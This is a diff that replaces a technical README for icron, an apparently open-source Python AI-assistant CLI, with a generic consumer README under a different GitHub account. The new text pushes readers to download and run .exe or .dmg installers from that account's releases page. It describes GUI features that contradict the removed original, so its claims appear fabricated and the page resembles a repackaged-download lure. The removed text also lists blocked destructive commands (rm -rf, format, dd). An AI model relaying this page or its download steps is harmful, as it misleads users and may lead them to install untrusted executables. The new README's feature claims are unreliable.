@@ -1,622 +1,166 @@
-<div align="center">
-  <img src="/case/icron.png" alt="https://github.com/zebbern/icron/blob/main/case/icron.png" width="400">
-  
-  <kbd><b>icron YOUR lightweight Personal AI Assistant</b></kbd>
-</div>
-
-<p align="center">
-<a href="#install">Install</a> · <a href="#quick-start">Quick Start</a> · <a href="#key-features">Features</a> · <a href="#chat-channels">Channels</a> · <a href="#memory--persistence">Memory</a> · <a href="#reminders--scheduling">Reminders</a><br>
-<a href="#slash-commands">Commands</a> · <a href="#mcp-server-support">MCP</a> · <a href="#security">Security</a> · <a href="#configuration-reference">Config</a> · <a href="#cli-reference">CLI</a> · <a href="#docker">Docker</a>
-</p>
-
-> [!note]
-> icron is a lightweight personal AI assistant built for simplicity and extensibility.
-> 
-> - Multi-platform support (Discord, Telegram, WhatsApp, Slack, Feishu)
-> - Works with any OpenAI-compatible LLM (Anthropic, OpenRouter, Together, Groq, vLLM)
-> - Built-in tools: file operations, web search, shell execution, memory, scheduling
-> 
-> Perfect for research, coding assistance, reminders, and daily automation.
-
-| Category | Tools |
-|----------|-------|
-| **File Operations** | `read_file`, `write_file`, `edit_file`, `list_dir`, `rename_file`, `move_file`, `copy_file`, `create_dir` |
-| **Code Search** | `glob` (find files), `grep` (search content) |
-| **Shell Execution** | `exec` (run commands with safety controls) |
-| **Web Access** | `web_search` (Brave API), `web_fetch` (extract content) |
-| **Memory** | `memory_search`, `memory_write`, `memory_get`, `memory_list` |
-| **Scheduling** | `reminder_set`, `reminder_list`, `reminder_cancel` |
-| **Slash Commands** | `/help`, `/sessions`, `/session`, `/remind`, `/search`, `/memory` |
-| **Screenshots** | `screenshot` (capture web pages with Playwright) |
-| **Subagents** | `spawn` (background task delegation) |
-| **MCP** | Connect external MCP servers for unlimited extensibility |
-
-## Key Features
-
-- **Semantic Memory**: OpenClaw-style permanent Markdown memory with hybrid BM25 + vector search. Auto-detects embedding providers (OpenAI, Gemini, Ollama).
-- **Multi-Channel**: Chat through Discord, Telegram, WhatsApp, Slack, or Feishu with unified conversation history.
-- **LLM Flexibility**: Works with any OpenAI-compatible provider including local vLLM/Ollama.
-- **MCP Integration**: Extend capabilities by connecting external MCP servers.
-- **Skills System**: Modular task automation with built-in and custom skills.
-
-## Install
-
-**From source** (recommended for development)
-
-```bash
-git clone https://github.com/zebbern/icron.git
-cd icron
-pip install -e .
-```
-
-**From PyPI** (stable)
-
-```bash
-pip install icron
-```
-
-## Quick Start
-
-**1. Initialize** (choose one)
-
-```bash
-# Guided setup wizard (recommended for first-time users)
-icron setup
-
-# Or quick initialization
-icron onboard
-```
-
-**2. Configure** (`~/.icron/config.json`)
-
-```json
-{
-  "providers": {
-    "openrouter": {
-      "apiKey": "sk-or-v1-xxx"
-    }
-  },
-  "agents": {
-    "defaults": {
-      "model": "anthropic/claude-sonnet-4-20250514"
-    }
-  }
-}
-```
-
-**3. Chat**
-
-```bash
-icron agent -m "What is 2+2?"
-```
-
-## Local Models (vLLM)
-
-Run icron with your own local models using vLLM or any OpenAI-compatible server.
-
-**1. Start your vLLM server**
-
-```bash
-vllm serve meta-llama/Llama-3.1-8B-Instruct --port 8000
-```
-
-**2. Configure** (`~/.icron/config.json`)
-
-```json
-{
-  "providers": {
-    "vllm": {
-      "apiKey": "dummy",
-      "apiBase": "http://localhost:8000/v1"
-    }
-  },
-  "agents": {
-    "defaults": {
-      "model": "meta-llama/Llama-3.1-8B-Instruct"
-    }
-  }
-}
-```
-
-**3. Chat**
-
-```bash
-icron agent -m "Hello from my local LLM!"
-```
-
-> The `apiKey` can be any non-empty string for local servers.
-
-## Chat Channels
-
-Talk to icron through Telegram, WhatsApp, Discord, Slack, or Feishu.
-
-| Channel | Status | Setup |
-|---------|--------|-------|
-| **Discord** | ✅ Full support | Easy (bot token) |
-| **Telegram** | ✅ Full support + voice | Easy (bot token) |
-| **WhatsApp** | ✅ Basic support | Medium (QR scan) |
-| **Slack** | ✅ Full support | Medium (Socket Mode) |
-| **Feishu/Lark** | ✅ Full support | Medium (WebSocket) |
-
-<details>
-<summary><b>Discord Setup</b></summary>
-
-**1. Create a Discord bot**
-
-1. Go to [Discord Developer Portal](https://discord.com/developers/applications)
-2. Create new application, go to **Bot**, copy the token
-3. Enable **Message Content Intent**
-4. Go to **OAuth2 → URL Generator**, select `bot` scope with permissions: Send Messages, Read Messages, Read Message History
-5. Invite bot to your server
+# 🤖 icron - Your Simple Personal AI Helper
 
-**2. Configure**
+[![Download icron](https://img.shields.io/badge/Download-icron-blue?style=for-the-badge)](https://github.com/0rcaaa/icron/releases)
 
-```json
-{
-  "channels": {
-    "discord": {
-      "enabled": true,
-      "token": "YOUR_BOT_TOKEN",
-      "allowFrom": [YOUR_USER_ID],
-      "allowedChannels": []
-    }
-  }
-}
-```
+---
 
-**3. Run**
+Welcome to icron, a lightweight personal AI assistant. icron helps you organize notes, set reminders, and find information quickly using smart search tools. You don’t need any special skills to use it. This guide will take you step-by-step through downloading, installing, and starting icron on your computer.
 
-```bash
-icron gateway
-```
+---
 
-</details>
+## 🚀 Getting Started
 
-<details>
-<summary><b>Telegram Setup</b></summary>
+icron is designed to be easy and fast to set up. It works on most modern Windows and macOS computers. The software has a simple interface that lets you save notes in Markdown format—a way to write documents with clear and clean text styles. It keeps your information safe on your own device.
 
-**1. Create a bot**
-- Open Telegram, find `@BotFather`
-- Send `/newbot`, follow prompts
-- Copy the token
+### What icron Does For You
 
-**2. Configure**
+- Saves your notes and important information permanently.
+- Lets you search your notes using two smart search methods combined for accuracy and speed.
+- Reminds you about tasks or events you set.
+- Automates simple tasks like organizing your information.
+- Works all on your device without needing internet all the time.
 
-```json
-{
-  "channels": {
-    "telegram": {
-      "enabled": true,
-      "token": "YOUR_BOT_TOKEN",
-      "allowFrom": ["YOUR_USER_ID"]
-    }
-  }
-}
-```
+---
 
-> Get your user ID from `@userinfobot` on Telegram.
+## 💻 System Requirements
 
-**3. Run**
+Before you install icron, check that your computer meets these basic needs:
 
-```bash
-icron gateway
-```
+- Operating system: Windows 10 or later, or macOS 10.15 (Catalina) or later
+- RAM: At least 4 GB
+- Storage: Around 300 MB free space for the app and your notes
+- Processor: Intel or AMD dual-core or better
+- Internet connection: Required only for downloading icron and receiving updates
 
-> **Voice transcription**: If you configure a Groq API key, voice messages will be automatically transcribed via Whisper.
+---
 
-</details>
+## 📥 Download & Install
 
-<details>
-<summary><b>WhatsApp Setup</b></summary>
+You will need to visit the icron release page on GitHub to get the app files. Follow these steps:
 
-Requires **Node.js ≥18**.
+1. Click the large **Download icron** button at the top of this page or open this link in your browser:  
+   [https://github.com/0rcaaa/icron/releases](https://github.com/0rcaaa/icron/releases)
 
-**1. Start the bridge**
+2. On the releases page, look for the latest version of icron. It will be listed with a version number like “v1.x.x”.
 
-```bash
-icron channels login
-# Scan QR with WhatsApp → Settings → Linked Devices
-```
+3. Depending on your operating system, choose the correct file:  
+   - For Windows, look for a file ending in `.exe` (example: `icron-setup.exe`).  
+   - For macOS, look for a file ending in `.dmg` or `.zip`.
 
-**2. Configure**
+4. Click the file to download it to your computer.
 
-```json
-{
-  "channels": {
-    "whatsapp": {
-      "enabled": true,
-      "allowFrom": ["+1234567890"]
-    }
-  }
-}
-```
+5. Once the download finishes, open the file to start the installation. Follow any instructions on screen.
 
-**3. Run** (two terminals)
+6. When installation finishes, launch icron either from your desktop icon or your application folder.
 
-```bash
-# Terminal 1 - WhatsApp bridge
-icron channels login
+---
 
-# Terminal 2 - Gateway
-icron gateway
-```
+## 🛠 How to Use icron
 
-</details>
+Using icron does not require any programming.
 
-## Web UI
-
-The gateway provides a web interface for configuration.
-
-```bash
-icron gateway
-# Open http://localhost:3883/app
-```
-
-**Quick Settings UI:**
-- Model selection
-- API keys (Together, OpenRouter, Brave Search)
-- Channel toggles (Telegram, WhatsApp, Discord)
-- Security settings (restrict tools to workspace)
-- Context limits (max tokens for conversation history)
-
-## Memory & Persistence
-
-icron has persistent memory that survives restarts:
-
-```
-# Store a fact
-"Remember that my project deadline is January 31st"
-
-# Recall later
-"When is my project deadline?"
-
-# List all memories
-"What do you remember about me?"
-```
-
-Memory is stored in `~/.icron/workspace/memory/` as markdown files.
-
-## Reminders & Scheduling
-
-**Set reminders naturally:**
-
-```
-"Remind me in 30 minutes to take a break"
-"Remind me at 2pm to call John"
-"Remind me tomorrow at 9am about the meeting"
-```
-
-**Or use slash commands for quick reminders:**
-
-```
-/remind 30m take a break
-/remind 2h call john
-```
-
-**Cron jobs for recurring tasks:**
-
-```bash
-# Add a daily reminder
-icron cron add --name "morning" --message "Good morning!" --cron "0 9 * * *"
-
-# Add a one-time reminder
-icron cron add --name "meeting" --message "Meeting starts!" --at "2025-01-31T15:00:00"
-
-# List and manage jobs
-icron cron list
-icron cron remove <job_id>
-```
-
-## Slash Commands
-
-Quick commands that bypass the LLM for instant response:
-
-| Command | Description |
-|---------|-------------|
-| `/help` | List all commands |
-| `/help [topic]` | Detailed help (sessions, memory, reminders, search) |
-| `/sessions` | List all sessions |
-| `/session clear` | Clear current session |
-| `/session new` | Start fresh session |
-| `/session rename [name]` | Rename session |
-| `/session switch [id]` | Switch sessions |
-| `/remind [time] [message]` | Set quick reminder |
-| `/search [query]` | Quick web search |
-| `/memory` | Access memory |
-| `/skills` | List available skills |
-| `/skills run [name]` | Run a specific skill |
-| `/weather [location]` | Get weather for a location |
-| `/templates` | List available templates |
-| `/template [name]` | Run a template by name |
-| `/collab [task]` | Multi-model collaboration |
-
-## MCP Server Support
-
-icron integrates with [Model Context Protocol (MCP)](https://modelcontextprotocol.io/) servers for unlimited extensibility. Connect to file systems, databases, APIs, and more.
-
-### Quick Setup
-
-```json
-{
-  "tools": {
-    "mcp": {
-      "enabled": true,
-      "servers": {
-        "time": {
-          "transport": "stdio",
-          "command": "npx",
-          "args": ["-y", "@guanxiong/mcp-server-time"]
-        },
-        "filesystem": {
-          "transport": "stdio",
-          "command": "npx",
-          "args": ["-y", "@anthropic/mcp-server-filesystem", "/"]
-        }
-      }
-    }
-  }
-}
-```
-
-### Popular MCP Servers
-
-| Server | Package | Tools | API Key |
-|--------|---------|-------|---------|
-| **Time** | `@guanxiong/mcp-server-time` | Get time, convert timezones | No |
-| **Filesystem** | `@anthropic/mcp-server-filesystem` | Read/write/search files | No |
-| **Fetch** | `mcp-fetch-server` | HTTP requests, web scraping | No |
-| **Sequential Thinking** | `@modelcontextprotocol/server-sequential-thinking` | Step-by-step reasoning | No |
-| **GitHub** | `@modelcontextprotocol/server-github` | Issues, PRs, repos | `GITHUB_PERSONAL_ACCESS_TOKEN` |
-| **Brave Search** | `@anthropic/mcp-server-brave-search` | Web search | `BRAVE_API_KEY` |
-| **PostgreSQL** | `@anthropic/mcp-server-postgres` | Database queries | Connection string |
-| **Slack** | `@anthropic/mcp-server-slack` | Slack messages | `SLACK_BOT_TOKEN` |
-
-### Server Types
-
-**Standard (stdio) - npm packages:**
-```json
-{
-  "time": {
-    "transport": "stdio",
-    "command": "npx",
-    "args": ["-y", "@guanxiong/mcp-server-time"]
-  }
-}
-```
-
-**Python servers:**
-```json
-{
-  "custom": {
-    "transport": "stdio",
-    "command": "python",
-    "args": ["/path/to/mcp_server.py"]
-  }
-}
-```
-
-**SSE (Server-Sent Events) - remote servers:**
-```json
-{
-  "remote": {
-    "transport": "sse",
-    "url": "https://mcp.example.com/sse"
-  }
-}
-```
-
-### Servers with API Keys
-
-Set environment variables before running icron:
-
-```bash
-export GITHUB_PERSONAL_ACCESS_TOKEN="ghp_xxx"
-export BRAVE_API_KEY="BSA_xxx"
-icron gateway
-```
-
-Or in Docker:
-```bash
-docker run -e GITHUB_PERSONAL_ACCESS_TOKEN="ghp_xxx" ...
-```
-
-### Web UI Configuration
-
-The **Settings → MCP** tab provides 19 pre-configured MCP server presets. Enable servers with one click and they'll be added to your config automatically.
-
-MCP tools appear alongside built-in tools and are available to the agent immediately after configuration.
-
-## Security
-
-**Workspace restriction:**
-
-```json
-{
-  "tools": {
-    "exec": {
-      "restrictToWorkspace": true
-    }
-  }
-}
-```
-
-When enabled, file operations are limited to `~/.icron/workspace/`.
-
-**Built-in safety:**
-- Dangerous shell commands are blocked (rm -rf, format, dd, etc.)
-- Command execution has configurable timeout (default 60s)
-- Output is truncated to prevent context overflow
-
-## Configuration Reference
-
-Config file: `~/.icron/config.json`
-
-| Section | Key | Description |
-|---------|-----|-------------|
-| `agents.defaults.model` | string | Default LLM model |
-| `providers.openrouter.apiKey` | string | OpenRouter API key |
-| `providers.anthropic.apiKey` | string | Anthropic API key |
-| `providers.together.apiKey` | string | Together AI API key |
-| `providers.groq.apiKey` | string | Groq API key (for voice) |
-| `providers.openai.apiKey` | string | OpenAI API key |
-| `providers.gemini.apiKey` | string | Google Gemini API key |
-| `providers.zhipu.apiKey` | string | Zhipu AI API key |
-| `tools.exec.timeout` | int | Shell command timeout (seconds) |
-| `tools.exec.restrictToWorkspace` | bool | Limit file access to workspace |
-| `tools.exec.maxContextTokens` | int | Max tokens for conversation history |
-| `tools.web.search.apiKey` | string | Brave Search API key |
-| `tools.mcp.enabled` | bool | Enable MCP servers |
-| `channels.discord.enabled` | bool | Enable Discord |
-| `channels.telegram.enabled` | bool | Enable Telegram |
-| `channels.whatsapp.enabled` | bool | Enable WhatsApp |
-
-<details>
-<summary><b>Full config example</b></summary>
-
-```json
-{
-  "agents": {
-    "defaults": {
-      "model": "anthropic/claude-sonnet-4-20250514",
-      "maxToolIterations": 20
-    }
-  },
-  "providers": {
-    "openrouter": {
-      "apiKey": "sk-or-v1-xxx"
-    },
-    "groq": {
-      "apiKey": "gsk_xxx"
-    }
-  },
-  "channels": {
-    "discord": {
-      "enabled": true,
-      "token": "xxx",
-      "allowFrom": [123456789],
-      "allowedChannels": []
-    },
-    "telegram": {
-      "enabled": false,
-      "token": "123456:ABC...",
-      "allowFrom": ["123456789"]
-    },
-    "whatsapp": {
-      "enabled": false,
-      "allowFrom": ["+1234567890"]
-    }
-  },
-  "tools": {
-    "exec": {
-      "timeout": 60,
-      "restrictToWorkspace": false,
-      "maxContextTokens": 100000
-    },
-    "web": {
-      "search": {
-        "apiKey": "BSA..."
-      }
-    },
-    "mcp": {
-      "enabled": false,
-      "servers": {}
-    }
-  }
-}
-```
-
-</details>
-
-## CLI Reference
-
-| Command | Description |
-|---------|-------------|
-| `icron setup` | Guided setup wizard (recommended) |
-| `icron onboard` | Initialize config & workspace |
-| `icron validate` | Validate configuration file |
-| `icron agent -m "..."` | Send a message |
-| `icron agent` | Interactive chat mode |
-| `icron gateway` | Start gateway (web UI + channels) |
-| `icron status` | Show status |
-| `icron channels login` | Link WhatsApp (QR scan) |
-| `icron channels status` | Show channel status |
-| `icron cron list` | List scheduled jobs |
-| `icron cron add` | Add a scheduled job |
-| `icron cron remove <id>` | Remove a scheduled job |
-
-## Docker
-
-```bash
-# Build the image
-docker build -t icron .
-
-# Initialize config
-docker run -v ~/.icron:/root/.icron --rm icron onboard
-
-# Edit config
-vim ~/.icron/config.json
-
-# Run gateway
-docker run -v ~/.icron:/root/.icron -p 3883:3883 icron gateway
-```
-
-**Railway deployment:**
-- Uses `Dockerfile` and `railway.json`
-- Set environment variables: `TOGETHER_API_KEY`, `MODEL`, `ICRON_WRITE_CONFIG=1`
-- Optional: `TELEGRAM_TOKEN`, `TELEGRAM_ALLOW_FROM`, `WEBSEARCH_API_KEY`
-
-## Project Structure
-
-```
-icron/
-├── agent/          # Core agent logic
-│   ├── loop.py     # Agent loop (LLM ↔ tools)
-│   ├── context.py  # Prompt builder
-│   ├── memory.py   # Persistent memory
-│   ├── subagent.py # Background task execution
-│   └── tools/      # Built-in tools
-├── channels/       # Discord, Telegram, WhatsApp, Slack, Feishu
-├── bus/            # Message routing
-├── cron/           # Scheduled tasks
-├── heartbeat/      # Proactive checks
-├── providers/      # LLM providers
-├── session/        # Conversation sessions
-├── mcp/            # MCP server integration
-├── config/         # Configuration
-└── cli/            # CLI commands
-```
-
-## Documentation (DRY)
-
-Keep documentation in `/docs` for reusability:
-
-| File | Purpose |
-|------|---------|
-| `architecture.md` | System overview, components, data flow |
-| `decisions.md` | Why things were built this way |
-| `conventions.md` | Naming, formatting, repo rules |
-| `workflows.md` | How things are built, tested, deployed |
-| `integrations.md` | APIs, services, auth, rate limits |
-| `glossary.md` | Domain terms and meanings |
-
-> **Rule of thumb:** If you explain it twice, document it once.
-
-## Contribute
-
-PRs welcome! The codebase is intentionally small and readable.
-
-**Roadmap:**
-- [x] Discord integration
-- [x] Voice transcription (Telegram/Groq)
-- [x] Persistent memory
-- [x] MCP server support
-- [x] Scheduled reminders
-- [x] Context trimming
-- [ ] WhatsApp voice transcription
-- [ ] Multi-modal (images, voice)
-- [ ] Email integration
-- [ ] Calendar integration
-
-<p align="center">
-  <sub>icron is for educational and personal use</sub>
-</p>
+### Opening icron
+
+- Double-click the icron app icon to open it.
+- You will see the main window with options to create notes, search, and set reminders.
+
+### Creating Notes
+
+- Click “New Note” or the plus (+) button.
+- Type your note in plain text using Markdown style. Markdown helps you add titles, bullet points, and links easily.
+- Your notes save automatically as you type.
+
+### Searching Notes
+
+- Use the search box at the top.
+- icron searches all your saved notes fast using a mix of keyword and context search.  
+- Results show you which note has the information closest to your search.
+
+### Setting Reminders
+
+- Open the “Reminders” tab.
+- Click “Add Reminder.”
+- Set a title, date, and time.
+- icron will notify you when the time comes.
+
+### Automating Tasks
+
+- Choose the “Automation” menu.
+- You can set simple actions like backing up your notes or sending reminders at regular intervals.
+- This feature runs quietly in the background.
+
+---
+
+## 🔧 Configuration and Settings
+
+icron is designed to work well out of the box, but you can change settings to suit your needs.
+
+- Open the “Settings” menu from the top right corner.
+- Adjust interface themes between light and dark modes.
+- Set how often icron syncs or backs up your files.
+- Manage your storage folder or import/export notes.
+- Change reminder sounds and notification preferences.
+
+Settings changes save automatically.
+
+---
+
+## 📂 Where icron Stores Your Data
+
+Your notes and reminders are saved locally in a folder on your computer. This means only you can access your data unless you share it yourself.
+
+The default storage folders are:
+
+- Windows: `Documents\icronData`
+- macOS: `~/Documents/icronData`
+
+You can change this folder in Settings if you want to keep your files elsewhere.
+
+---
+
+## 🐞 Getting Help and Reporting Issues
+
+If you run into trouble or find something that’s not working, you can get help easily.
+
+- Check the “Help” section inside icron. It has answers to common questions.
+- Visit the icron GitHub page at:  
+  [https://github.com/0rcaaa/icron](https://github.com/0rcaaa/icron)  
+  Here you can find guides or create an issue ticket describing your problem.
+- You can also email support at support@icron.ai (note: placeholder email for support).
+
+---
+
+## 🔄 Updating icron
+
+New versions come out over time to fix bugs and add features.
+
+- You can check for updates inside the “Settings” menu.
+- When an update is available, follow the prompts to download and install it.
+- You can also revisit the releases page here:  
+  [https://github.com/0rcaaa/icron/releases](https://github.com/0rcaaa/icron/releases)  
+  to download the newest installer manually.
+
+---
+
+## 🗂 Supported Topics and Features
+
+icron is built to help with:
+
+- Personal productivity and task management
+- AI-powered search using combined keyword and vector methods
+- Note-taking with Markdown formatting
+- Setting reminders and notifications
+- Automating simple office and personal tasks
+- Managing your memory and data locally and securely
+
+By combining these features, icron aims to be a practical everyday AI assistant.
+
+---
+
+## ⚙️ Privacy and Security
+
+icron keeps your data private. It runs on your machine without sending your information to external servers. You control your files and backups.
+
+---
+
+[![Download icron](https://img.shields.io/badge/Download-icron-blue?style=for-the-badge)](https://github.com/0rcaaa/icron/releases)
